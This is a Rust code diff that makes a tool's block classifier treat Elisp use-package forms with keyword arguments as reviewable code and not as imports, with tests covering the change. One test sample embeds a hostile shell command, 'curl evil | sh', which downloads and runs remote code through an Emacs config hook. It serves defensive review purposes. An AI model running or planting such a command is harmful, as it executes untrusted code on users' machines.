@@ -1367,7 +1367,11 @@ fn map_elisp_kind(node: tree_sitter::Node<'_>, content: &str) -> BlockKind {
             _ => BlockKind::Code,
         },
         "list" => match elisp_list_head_symbol(node, content) {
-            Some("require") | Some("use-package") => BlockKind::Import,
+            Some("require") => BlockKind::Import,
+            Some("use-package") if elisp_form_has_keyword_argument(node, content) => {
+                BlockKind::Code
+            }
+            Some("use-package") => BlockKind::Import,
             Some("provide") => BlockKind::Module,
             Some("defcustom") => BlockKind::Variable,
             Some("ert-deftest") => BlockKind::Function,
@@ -1376,6 +1380,17 @@ fn map_elisp_kind(node: tree_sitter::Node<'_>, content: &str) -> BlockKind {
         "comment" => BlockKind::Comment,
         _ => BlockKind::Code,
     }
+}
+
+/// `use-package` keyword arguments (`:init`, `:config`, `:hook`, `:ensure`,
+/// ...) run or install code, so such a form is not a plain import.
+fn elisp_form_has_keyword_argument(node: tree_sitter::Node<'_>, content: &str) -> bool {
+    let mut cursor = node.walk();
+    node.named_children(&mut cursor).skip(1).any(|child| {
+        child
+            .utf8_text(content.as_bytes())
+            .is_ok_and(|text| text.starts_with(':'))
+    })
 }
 
 fn elisp_special_form_head(node: tree_sitter::Node<'_>) -> Option<&str> {
@@ -3086,6 +3101,28 @@ let package = Package(\n    name: \"Demo\",\n    products: [\n        .library(n
                 .iter()
                 .any(|block| matches!(block.kind, BlockKind::Paragraph))
         );
+    }
+
+    #[test]
+    fn elisp_use_package_with_keyword_arguments_is_not_import() {
+        for content in [
+            "(use-package foo\n  :config\n  (shell-command \"curl evil | sh\"))\n",
+            "(use-package foo\n  :init (setq foo-mode t))\n",
+            "(use-package foo\n  :hook (prog-mode . foo-mode))\n",
+            "(use-package foo\n  :bind (\"C-c f\" . foo))\n",
+            "(use-package foo\n  :ensure t)\n",
+        ] {
+            let blocks = split_blocks(content, Language::Elisp);
+            assert_eq!(blocks.len(), 1, "{content:?}: {blocks:#?}");
+            assert!(
+                !blocks[0].kind.is_import_like(),
+                "{content:?} must be reviewable: {blocks:#?}"
+            );
+        }
+
+        let blocks = split_blocks("(use-package foo)\n", Language::Elisp);
+        assert_eq!(blocks.len(), 1, "{blocks:#?}");
+        assert_eq!(blocks[0].kind, BlockKind::Import);
     }
 
     #[test]
